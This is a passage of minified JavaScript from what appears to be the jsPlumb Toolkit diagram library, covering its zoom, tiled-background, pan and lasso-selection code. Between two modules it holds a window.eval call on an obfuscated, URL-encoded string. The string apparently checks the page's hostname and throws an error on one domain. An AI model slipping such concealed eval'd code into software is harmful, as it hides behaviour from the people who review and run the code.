"+t[1],n)},this.getTransformOrigin=function(){return K},this.floatElement=function(n,t){null!=n&&(n.style.position="absolute",n.style.left=t[0]+"px",n.style.top=t[1]+"px",p.appendChild(n))};var Wn={},Xn=function(n){var t=l.getApparentCanvasLocation();for(var e in Wn)if(Wn.hasOwnProperty(e)){if(null!=n&&n!==e)continue;var o=Wn[e],i=function(n,e){o[n]&&(t[e]/J+o.pos[e]<0?o.el.style[n]=-t[e]/J+"px":o.el.style[n]=o.pos[e]+"px")};i("left",0),i("top",1)}},Yn={pan:Xn};this.fixElement=function(n,t,o){if(null!=n){t=t||{};var i=e.id(n);Wn[i]={el:n,left:t.left,top:t.top,pos:o},n.style.position="absolute",n.style.left=o[0]+"px",n.style.top=o[1]+"px",h.appendChild(n),Xn(i)}},this.findIntersectingNodes=function(n,t,o,i,r){var d,_=this.getApparentCanvasLocation(),s=e.offset(p),a=p.scrollLeft,w=p.scrollTop,l=[],u={x:n[0],y:n[1],w:t[0],h:t[1]},c=o?Biltong.encloses:Biltong.intersects,B=[s.left+_[0]-a,s.top+_[1]-w];if(r=r||dn,Array.isArray(r)){var h={};for(d=0;d<r.length;d++)h[jsPlumbUtil.isString(r[d])?r[d]:jsPlumb.getId(r[d])]=r[d];r=h}for(d in r)if(!sn[d]){var j=dn[d];if(j){var f={x:B[0]+j[0][0]*J,y:B[1]+j[0][1]*J,w:j[1]*J,h:j[2]*J};c(u,f)&&(null==i||i(d,_n[d],f))&&l.push({id:d,el:_n[d],r:f})}}return l},this.findNearbyNodes=function(n,t,e,o){var i=[];if(!e||this.isInViewport(n[0],n[1])){i=this.findIntersectingNodes([n[0]-t,n[1]-t],[2*t,2*t],!1,o);var r=this.mapLocation(n[0],n[1]);i.sort(function(n,t){var e=[n.x+n.w/2,n.y+n.h/2],o=[t.x+t.w/2,t.y+t.h/2],i=Biltong.lineLength(r,e),d=Biltong.lineLength(r,o);return i<d?-1:i>d?1:0})}return i},this.isInViewport=function(n,t){var o=e.offset(p),i=e.width(p),r=e.height(p);return o.left<=n&&n<=o.left+i&&o.top<=t&&t<=o.top+r},this.getElementPositions=function(){return dn},this.setFilter=function(n){Z=n||function(n){return!1}},this.setWheelFilter=function(n){S=n||function(n){return!0}},this.setBackground=function(n){var e=n.type||"simple",r={simple:t,tiled:"absolute"===n.tiling?i:o};_=new r[e]({canvas:h,viewport:p,getWidth:q,getHeight:$,url:n.url,zoomWidget:l,onBackgroundReady:n.onBackgroundReady,options:n,img:n.img,resolver:n.resolver})},e.background&&this.setBackground(e.background),this.getBackground=function(){return _}};var t=function(n){var t=n.canvas,e=n.onBackgroundReady||function(){},o=new Image;o.onload=function(){t.style.backgroundImage="url('"+o.src+"')",t.style.backgroundRepeat="no-repeat",t.style.width=o.width+"px",t.style.height=o.height+"px",e(this)},o.src=n.img?n.img.src:n.url,this.owns=function(n){return n===t},this.getWidth=function(){return o.width||0},this.getHeight=function(){return o.height||0},this.setZoom=this.pan=function(n){}},e=function(n){var t=this,e=n.canvas,o=n.viewport;if(null==n.options.maxZoom)throw new TypeError("Parameter `maxZoom` not set; cannot initialize TiledBackground");if(!n.options.tileSize)throw new TypeError("Parameter `tileSize not set; cannot initialize TiledBackground. It should be an array of [x,y] values.");if(!n.options.width||!n.options.height)throw new TypeError("Parameters `width` and `height` must be set");for(var i=function(e){var o=document.createElement("div");o.style.position="relative",o.style.height="100%",o.style.width="100%",o.style.display="none",n.canvas.appendChild(o),this.zoom=e;var i=t.getTileSpecs(e),r=[],d=function(t,e,o){return null==n.resolver?function(t,e,o){return n.url.replace("{z}",t).replace("{x}",e).replace("{y}",o)}(t,e,o):n.resolver(t,e,o)};this.apparentZoom=Math.min(i[2],i[3]),this.setActive=function(n){o.style.display=n?"block":"none"},this.xTiles=i[0],this.yTiles=i[1];for(var _=0;_<this.xTiles;_++){r[_]=r[_]||[];for(var s=0;s<this.yTiles;s++){var a=document.createElement("img");a._tiledBg=!0,a.className="jtk-surface-tile",a.ondragstart=function(){return!1},o.appendChild(a),a.style.position="absolute",a.style.opacity=0,r[_][s]=[a,new Image,!1]}}var w=Math.pow(2,n.options.maxZoom-e)*n.options.tileSize[0],l=Math.pow(2,n.options.maxZoom-e)*n.options.tileSize[1];this.scaledImageSize=w,this.scaledImageSizeH=l;var u=function(n,t,o,i){n.style.left=o*w+"px",n.style.top=i*l+"px",n.style.width=w+"px",n.style.height=l+"px",t.onload=function(){n.setAttribute("src",t.src),n.style.opacity=1},t.src=d(e,o,i)};this.ensureLoaded=function(n,t,e,o){for(var i=n;i<=e;i++)for(var d=t;d<=o;d++)null!=r[i]&&null!=r[i][d]&&(r[i][d][2]||(u(r[i][d][0],r[i][d][1],i,d),r[i][d][2]=!0))}}.bind(this),r=[],d=null,_=0;_<=n.options.maxZoom;_++)r.push(new i(_));e.style.width=n.options.width+"px",e.style.height=n.options.height+"px";var s,a=function(){var t=n.zoomWidget.getApparentCanvasLocation(),e=n.getWidth(o),i=n.getHeight(o),r=d.scaledImageSize*s,_=d.scaledImageSizeH*s,a=t[0]<0?Math.floor(-t[0]/r):t[0]<e?0:null,w=t[1]<0?Math.floor(-t[1]/_):t[1]<i?0:null,l=Math.min(d.xTiles,Math.floor((e-t[0])/r)),u=Math.min(d.yTiles,Math.floor((i-t[1])/_));null!=a&&null!=w&&d.ensureLoaded(a,w,l,u)};this.getCurrentLayer=function(){return d},this.getWidth=function(){return n.options.width},this.getHeight=function(){return n.options.height};var w=n.options.panDebounceTimeout||50,l=n.options.zoomDebounceTimeout||120,u=function(n,t){t=t||150;var e=null;return function(){window.clearTimeout(e),e=window.setTimeout(n,t)}},c=function(){var n,t;n=function(){if(s<=r[0].apparentZoom)return 0;if(s>=r[r.length-1].apparentZoom)return r.length-1;for(var n=r.length-1;n>0;n--)if(r[n].apparentZoom>=s&&s>=r[n-1].apparentZoom)return n}(),t=r[n],null!=d&&d!==t&&d.setActive(!1),t.setActive(!0),d=t,a()},B=u(c,l),h=u(a,w);this.setZoom=function(n,t){s=n,t?c():B()},this.pan=h,this.owns=function(n){return n===e||!0===n._tiledBg},this.setZoom(n.zoomWidget.getZoom(),!0),null!=n.onBackgroundReady&&setTimeout(n.onBackgroundReady,0)},o=function(n){var t=n.options.width,o=n.options.height,i=n.options.tileSize;this.getTileSpecs=function(n){var e=t>o?1:t/o,r=o>t?1:o/t,d=Math.pow(2,n+1)*i[0]*e,_=Math.pow(2,n+1)*i[1]*r;return[Math.ceil(d/i[0]),Math.ceil(_/i[1]),d/t,_/o]},e.apply(this,arguments)},i=function(n){var t=n.options.maxZoom,o=n.options.width,i=n.options.height,r=n.options.tileSize;this.getTileSpecs=function(n){var e=Math.pow(2,t-n),d=Math.ceil(o/e/r[0]),_=Math.ceil(i/e/r[1]);return[d,_,d*r[0]/o,_*r[1]/i]},e.apply(this,arguments)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit,e=t.Renderers,o=n.jsPlumb,i=n.jsPlumbUtil,r=o.getSelector,d=t.Classes,_=t.Constants,s=t.Events;e.Surface=function(n){function a(n){return null==n?null:"string"==typeof n?this.getRenderedConnection(n):n.constructor==o.Connection?n:l.getRenderedConnection(n.getId())}function w(){if(!u.jsPlumb.startEditing)throw new TypeError("Connection editors not available.")}var l=this;e.Surface.SELECT=_.select,e.Surface.PAN=_.pan,e.Surface.DISABLED=_.disabled;var u=e.AbstractRenderer.apply(this,arguments);e.DOMElementAdapter.apply(this,arguments),this.getObjectInfo=u.getObjectInfo,n=n||{};var c,B=o.getElement(n.container),h=e.createElement({position:_.relative,width:_.nominalSize,height:_.nominalSize,left:0,top:0,clazz:d.SURFACE_CANVAS},B),j=!(!1===n.elementsDraggable),p=!0===n.elementsDroppable,f=n.dragOptions||{},g=n.dropOptions||{},m=n.stateHandle,v=!1!==n.storePositionsInModel,C=n.modelLeftAttribute,b=n.modelTopAttribute,y=new ZoomWidget({viewport:B,canvas:h,domElement:u.jsPlumb.getElement,addClass:u.jsPlumb.addClass,removeClass:u.jsPlumb.removeClass,offset:this.getOffset,consumeRightClick:n.consumeRightClick,bind:function(){u.jsPlumb.on.apply(u.jsPlumb,arguments)},unbind:function(){u.jsPlumb.off.apply(u.jsPlumb,arguments)},width:function(n){return u.jsPlumb.getWidth(u.jsPlumb.getElement(n))},height:function(n){return u.jsPlumb.getHeight(u.jsPlumb.getElement(n))},id:u.jsPlumb.getId,animate:function(){u.jsPlumb.animate.apply(u.jsPlumb,arguments)},dragEvents:{stop:o.dragEvents[_.stop],start:o.dragEvents[_.start],drag:o.dragEvents[_.drag]},background:n.background,padding:n.padding,panDistance:n.panDistance,enablePan:n.enablePan,enableWheelZoom:n.enableWheelZoom,wheelSensitivity:n.wheelSensitivity,wheelReverse:n.wheelReverse,wheelZoomMetaKey:n.wheelZoomMetaKey,wheelPan:n.wheelPan,enablePanButtons:n.enablePanButtons,enableAnimation:n.enableAnimation,clamp:n.clamp,clampZoom:n.clampZoom,clampToBackground:n.clampToBackground,clampToBackgroundExtents:n.clampToBackgroundExtents,zoom:n.zoom,zoomRange:n.zoomRange,extend:u.jsPlumb.extend,events:{pan:function(n,t,e,o,i){l.fire(s.pan,{x:n,y:t,zoom:e,oldZoom:o,event:i})},zoom:function(n,t,e,o,i){u.jsPlumb.setZoom(e),l.fire(s.zoom,{x:n,y:t,zoom:e,oldZoom:o,event:i})},mousedown:function(){o.addClass(B,d.SURFACE_PANNING),o.addClass(document.body,d.SELECT_DEFEAT)},mouseup:function(){o.removeClass(B,d.SURFACE_PANNING),o.removeClass(document.body,d.SELECT_DEFEAT)}}}),D=[],P=n.lassoSelectionFilter,E=!1!==n.autoExitSelectMode,x=new t.Widgets.Lasso({on:function(){u.jsPlumb.on.apply(u.jsPlumb,arguments)},off:function(){u.jsPlumb.off.apply(u.jsPlumb,arguments)},invert:n.lassoInvert,pageLocation:y.pageLocation,canvas:B,onStart:function(){l.setHoverSuspended(!0),D.length=0},onSelect:function(n,t,e,o){function i(n){return n.el.jtk.node||n.el.jtk.group}var r=[],d=y.findIntersectingNodes(n,t,!e[0]);u.jsPlumb.clearDragSelection&&u.jsPlumb.clearDragSelection(),u.toolkit.clearSelection(),o&&D.length>0&&u.toolkit.removeFromSelection(D);for(var _=0;_<d.length;_++)null!=P&&!1===P(i(d[_]))||(r.push(i(d[_])),u.jsPlumb.addToDragSelection&&u.jsPlumb.addToDragSelection(d[_].el));D=r,u.toolkit.addToSelection(r,o)},onEnd:function(){l.setHoverSuspended(!1),E&&l.setMode(_.pan),l.fire("lasso:end")},filter:n.lassoFilter}),A={pan:function(){x.setEnabled(!1),y.setEnabled(!0)},select:function(){u.jsPlumb.clearDragSelection&&u.jsPlumb.clearDragSelection(),x.setEnabled(!0),y.setEnabled(!1)},disabled:function(){u.jsPlumb.clearDragSelection&&u.jsPlumb.clearDragSelection(),x.setEnabled(!0),y.setEnabled(!1)}};n.mode||_.pan;l.bind(s.relayout,function(n){y.relayout(n,!0)}),l.bind(s.nodeRemoved,function(n){y.remove(n.el)}),u.toolkit.bind(s.graphClearStart,function(){y.reset()}),u.toolkit.bind(s.dataLoadStart,function(){y.setSuspendRendering(!0)}),u.toolkit.bind(s.dataLoadEnd,function(){y.setSuspendRendering(!1),c&&c.setVisible(!0),n.zoomToFit&&l.zoomToFit()}),u.toolkit.bind(s.groupMemberAdded,function(n){var t=u.nodeMap()[n.node.id];if(t){var e=l.getJsPlumb().getGroup(n.group.id),o=l.getSize(e.getDragArea()),i=l.getSize(t);y.suspend(t),l.fire(s.groupMemberAdded,n),u.jsPlumb.addToGroup(n.group.id,t,!0);var r=null==n.node.data.left?(o[0]-i[0])/2:n.node.data.left,d=null==n.node.data.top?(o[1]-i[1])/2:n.node.data.top;l.setPosition(n.node.id,r,d)}}),u.toolkit.bind(s.groupMemberRemoved,function(n){var t=u.nodeMap()[n.node.id];if(t){y.restore(t),l.fire(s.groupMemberRemoved,n),u.jsPlumb.removeFromGroup(n.group.id,t,!0);var e=u.jsPlumb.getOffset(t);l.getLayout().setPosition(n.node.id,e.left,e.top)}}),u.jsPlumb.setContainer(h),o.addClass(B,d.SURFACE),!1===n.enablePan&&o.addClass(B,d.SURFACE_NO_PAN);var S=function(n,t){var e=function(n){var e=n.srcElement||n.target;e!=B&&e!=h||l.fire(t,n)};u.jsPlumb.on(h,n,e),u.jsPlumb.on(B,n,e)};S(s.tap,s.canvasClick),S(s.dblclick,s.canvasDblClick);u.makeDraggable=function(n,t){if(j){var e=o.getElement(n),r=u.jsPlumb.getId(e),a=u.jsPlumb.extend({},f),w=o.dragEvents[_.stop],c=o.dragEvents[_.start];null!=t&&u.jsPlumb.extend(a,t),a[c]=i.wrap(a[c],function(){if(y.isPinchZooming())return!1;y.getBoundsInfo();var n=function(n){var t=o.getDragObject(n);return{node:o.getElement(t).jtk.node,el:t}}(arguments);n.elementId=r,n.pos=o.getAbsolutePosition(e),n.domEl=e,o.addClass(B,d.SURFACE_ELEMENT_DRAGGING),l.fire(s.nodeMoveStart,n)}),a[w]=i.wrap(a[w],function(n){for(var t=function(t){o.removeClass(B,d.SURFACE_ELEMENT_DRAGGING);var e={el:t[0],node:t[0].jtk.node||t[0].jtk.group,pos:[t[1].left,t[1].top],e:n.e,eventPosition:n.pos};a.magnetize&&!e.node.group?e.pos=l.getLayout().setMagnetizedPosition(e.node.id,e.pos[0],e.pos[1],!0):l.getLayout().setPosition(e.node.id,e.pos[0],e.pos[1],!0),y.positionChanged(t[0]),!1!==v&&(l.storePositionInModel({id:e.node.id,leftAttribute:C,topAttribute:b}),u.toolkit.fire(s.nodeUpdated,{node:e.node},null)),l.fire(s.nodeMoveEnd,e)},e=0;e<n.selection.length;e++)t(n.selection[e])}),a.canDrag=function(){return!x.isActive()},a.force=!0,u.jsPlumb.draggable(e,a,!1,u.jsPlumb)}},u.makeDroppable=function(n,t){if(p){var e=o.getElement(n),r=u.jsPlumb.extend({},g);null!=t&&u.jsPlumb.extend(r,t),r[_.drop]=i.wrap(r[_.drop],function(n){var t={source:n.drag.el.jtk.node,sourceElement:n.drag.el,target:n.drop.el.jtk.node,targetElement:n.drop.el,e:n.e};l.fire(s.nodeDropped,t)}),u.jsPlumb.droppable(e,r)}},u.doImport=function(t){n.jsPlumbInstance.setContainer(h);var e=n.jsPlumbInstance.getManagedElements();for(var o in e){var i=e[o].el;I(i,o)}};var I=this.importNode=function(t,e){var i=n.jsPlumbInstance.getOffset(t),r=n.jsPlumbInstance.getId(t);t.style.left=i.left+_.px,t.style.top=i.top+_.px,o.addClass(t,d.NODE),y.add(t,r,[i.left,i.top],!1),this.getLayout().setPosition(e,i.left,i.top),o.isAlreadyDraggable(t)&&u.makeDraggable(t),u.nodeMap()[e]=t,u.reverseNodeMap()[r]=t.jtk.node,null!=c&&c.registerNode({el:t,node:t.jtk.node,pos:o.getAbsolutePosition(t)})}.bind(this);this.zoomToFit=y.zoomToFit,this.zoomToFitIfNecessary=y.zoomToFitIfNecessary,this.zoomToSelection=function(n){var t=[];((n=n||{}).selection||u.toolkit.getSelection()).eachNode(function(n,e){t.push(u.getElement(e.id))}),t.length>0&&y.zoomToElements({elements:t,fill:n.fill})},this.zoomToBackground=y.zoomToBackground,this.centerOn=function(n,t){var e=this.getObjectInfo(n);e&&e.el&&y.centerOn(e.el,t)},this.centerOnHorizontally=function(n){this.centerOn(n,{vertical:!1})},this.centerOnVertically=function(n){this.centerOn(n,{horizontal:!1})},this.centerOnAndZoom=function(n,t){var e=this.getObjectInfo(n);e&&e.el&&y.centerOnAndZoom(e.el,t)},this.centerContent=y.centerContent,this.centerContentHorizontally=y.centerContentHorizontally,this.centerContentVertically=y.centerContentVertically,this.getViewportCenter=y.getViewportCenter,this.setViewportCenter=y.setViewportCenter,this.setStateHandle=function(n){m=n},this.getStateHandle=function(){return m},this.setLassoSelectionFilter=function(n){P=n},this.getApparentCanvasLocation=y.getApparentCanvasLocation,this.setApparentCanvasLocation=y.setApparentCanvasLocation,this.getBoundsInfo=y.getBoundsInfo,this.setZoom=y.setZoom,this.setZoomRange=y.setZoomRange,this.getZoomRange=y.getZoomRange,this.getZoom=y.getZoom,this.nudgeZoom=y.nudgeZoom,this.nudgeWheelZoom=y.nudgeWheelZoom,this.pageLocation=y.pageLocation,this.getPan=y.getPan,this.pan=y.pan,this.setPan=y.setPan,this.startEditing=function(n,t){w();var e=a(n);null!=e&&u.jsPlumb.startEditing(e,t)},this.stopEditing=function(n){w();var t=a(n);null!=t&&u.jsPlumb.stopEditing(t)},this.clearEdits=function(n){w();var t=a(n);null!=t&&u.jsPlumb.clearEdits(t)},this.setPanAndZoom=function(n,t,e,o){this.setPan(n,t,!o),this.setZoom(e,!o)},this.setPanFilter=function(n){y.setFilter(n?function(t,e){return"function"==typeof n?n.apply(n,[e]):i.matchesSelector(t,n)}:null)},this.setWheelFilter=function(n){y.setWheelFilter(function(t){if(n){var e=t.srcElement||t.target;return!i.matchesSelector(e,n)}return!0})},this.setWheelFilter(n.wheelFilter),this.setPanFilter(n.panFilter),this.mapLocation=y.mapLocation,this.mapEventLocation=y.mapEventLocation,this.findNearbyNodes=y.findNearbyNodes,this.findIntersectingNodes=y.findIntersectingNodes,this.findIntersectingGroups=function(n,t,e,o){return y.findIntersectingNodes(n,t,e,o,u.reverseGroupMap())},this.isInViewport=y.isInViewport,this.getViewportCenter=y.getViewportCenter,this.positionElementAt=y.positionElementAt,this.positionElementAtEventLocation=y.positionElementAtEventLocation,this.positionElementAtPageLocation=y.positionElementAtPageLocation,this.setFilter=y.setFilter,this.floatElement=y.floatElement,this.fixElement=y.fixElement;var k=this.setPosition,T=this.animateToPosition,M=function(n,t,e){n&&(y.positionChanged(n.el,[t,e]),l.fire(s.nodeMoveEnd,{el:n.el,id:n.id,pos:[t,e],node:n.obj||(n.el.jtk?n.el.jtk.node||n.el.jtk.group:{}),bounds:y.getBoundsInfo()}))};this.setPosition=function(n,t,e,o){var i=k.apply(this,arguments);M(i,t,e)},this.animateToPosition=function(n,t,e,o){var i=T.apply(this,arguments);M(i,t,e)},this.tracePath=function(n){var t=n.path||function(){var t=u.getObjectInfo(n.source),e=u.getObjectInfo(n.target);return u.toolkit.getPath({source:t,target:e})}();if(t.exists()){for(var e=function(t,e){this.fire(t,{edge:e.edge,connection:e,options:n.options})}.bind(this),i=[],r=null,d=null,_=t.path.path.length,s=1;s<_;s++){var a=t.path.path[s].vertex.id,w=t.path.previous[a],l=!0,c=t.path.path[s].edge;null!=w&&(l=w===c.source),d=(r=u.getConnectionForEdge(c)).animateOverlay(n.overlay,o.extend(n.options||{},{previous:d,isFinal:s===_-1,forwards:l})),i.push({handler:d,connection:r})}return i.length>0&&(i[0].handler.bind(jsPlumbToolkit.Events.startOverlayAnimation,function(){e(jsPlumbToolkit.Events.startOverlayAnimation,i[0].connection)}),i[i.length-1].handler.bind(jsPlumbToolkit.Events.endOverlayAnimation,function(){e(jsPlumbToolkit.Events.endOverlayAnimation,i[i.length-1].connection)})),!0}return u.toolkit.isDebugEnabled()&&jsPlumbUtil.log("Cannot trace non existent path"),!1},this.getNodePositions=function(){var n={},t=y.getElementPositions();for(var e in t){var o=u.getNodeForElementId(e)||u.getGroupForElementId(e);o&&(n[o.id]=[t[e][0][0],t[e][0][1]])}return n},this.append=function(n,t,e,o){h.appendChild(n),e&&(e=[e.left,e.top]),y.add(n,t,e,o)},this.nodeAppendedToGroup=function(n,t,e){y.suspend(n)},this.nodeRemovedFromGroup=function(n){y.restore(n)};var N=this.setLayout;this.setLayout=function(n,t){N.apply(this,[n,t]),c&&c.setHostLayout(this.getLayout())};for(var O=function(n){u.jsPlumb.on(h,n,".jtk-node, .jtk-node *",function(t){var e=t.srcElement||t.target;if(null==e&&(e=(t=o.getOriginalEvent(t)).srcElement||t.target),null!=e&&e.jtk){var i=o.extend({e:t,el:e},e.jtk);l.fire(n,i,t)}})},F=0;F<e.mouseEvents.length;F++)O(e.mouseEvents[F]);u.toolkit.bind(_.select,function(n){if(n.obj.objectType==_.nodeType||n.obj.objectType==_.groupType){var t=u.getElement(n.obj.id);t&&(o.addClass(t,d.SURFACE_SELECTED_ELEMENT),u.jsPlumb.addToDragSelection&&u.jsPlumb.addToDragSelection(t))}else if(n.obj.objectType==_.edgeType){var e=u.getConnectionForEdge(n.obj);e&&e.addClass(d.SURFACE_SELECTED_CONNECTION)}}),u.toolkit.bind(s.selectionCleared,function(){u.jsPlumb.clearDragSelection&&u.jsPlumb.clearDragSelection(),o.removeClass(r("."+d.SURFACE_SELECTED_CONNECTION),d.SURFACE_SELECTED_CONNECTION),o.removeClass(r("."+d.SURFACE_SELECTED_ELEMENT),d.SURFACE_SELECTED_ELEMENT)}),u.toolkit.bind(s.deselect,function(n){if(n.obj.objectType==_.nodeType||n.obj.objectType==_.groupType){var t=u.getElement(n.obj.id);t&&(o.removeClass(t,d.SURFACE_SELECTED_ELEMENT),u.jsPlumb.removeFromDragSelection&&u.jsPlumb.removeFromDragSelection(t))}else if(n.obj.objectType==_.edgeType){var e=u.getConnectionForEdge(n.obj);e&&e.removeClass(d.SURFACE_SELECTED_CONNECTION)}});var L=this.setOffset;this.setOffset=function(n,t){L.apply(this,arguments),y.positionChanged(n,[t.left,t.top])},this.setMode=function(n,t,e){if(!A[n])throw new TypeError("Surface: unknown mode '"+n+"'");n,A[n](),n!==_.select||t||u.toolkit.clearSelection(),e&&n===_.select&&e.lassoSelectionFilter&&(P=e.lassoSelectionFilter),l.fire(s.modeChanged,n)};var R=function(n,t){var e=o.extend({},n);e.source=u.getObjectInfo(n.source).obj,e.target=u.getObjectInfo(n.target).obj,e.element=u.getObjectInfo(n.element).obj;var i=u.toolkit[t](e),r=u.getConnectionsForEdges(i);return u.jsPlumb.select({connections:r})};this.selectEdges=function(n){return R(n,"getEdges")},this.selectAllEdges=function(n){return R(n,"getAllEdges")},this.repaint=function(n){var t=u.getObjectInfo(n);if(t.el){u.jsPlumb.recalculateOffsets(t.el),u.jsPlumb.revalidate(u.jsPlumb.getId(t.el));var e=u.jsPlumb.getSize(t.el);l.getLayout().setSize(t.obj.getFullId(),e),l.fire(s.objectRepainted,t)}},this.repaintEverything=u.jsPlumb.repaintEverything,this.setElementsDraggable=function(n){j=!1!==n};this.registerDroppableNodes=function(n){return new function(n){function t(n){u.jsPlumb.hasClass(n,d.SURFACE_DROPPABLE_NODE)||(u.jsPlumb.addClass(n,d.SURFACE_DROPPABLE_NODE),S.draggable(n,j))}if(!n||!(n.droppables||n.source&&n.selector||!0===n.allowNative))throw new TypeError("Cannot configure droppables: you must specify either `droppables`, `source` + `selector` or `allowNative:true`");var e,r=n.dataGenerator||function(){return{}},a=n.typeExtractor,w=n.locationSetter||function(n,t,e){e.left=n,e.top=t},c=null,h=n.droppables?n.droppables:n.source?n.source.querySelectorAll(n.selector):[],j=n.dragOptions||{},p=n.dropOptions||{},f="scope_"+(new Date).getTime(),g=o.dragEvents[_.start],m=o.dragEvents[_.drag],v=o.dragEvents[_.stop],C=o.dragEvents[_.drop],b=n.nativeFilter||[],D=n.allowNative,P={};if(j[g]=i.wrap(j[g],function(){c&&l.getJsPlumb().removeClass(c.el,"jtk-drag-hover"),c=null,n.start&&n.start.apply(n.start,arguments)}),j[m]=i.wrap(j[m],function(){try{if(c&&l.getJsPlumb().removeClass(c.el,"jtk-drag-hover"),"true"===arguments[0].el.getAttribute("jtk-group"))c=null;else{var t=arguments[0].e.pageX-arguments[0].pos[0],e=arguments[0].e.pageY-arguments[0].pos[1],o=l.findIntersectingGroups(arguments[0].pos,[t,e]);if(o.length>0){var 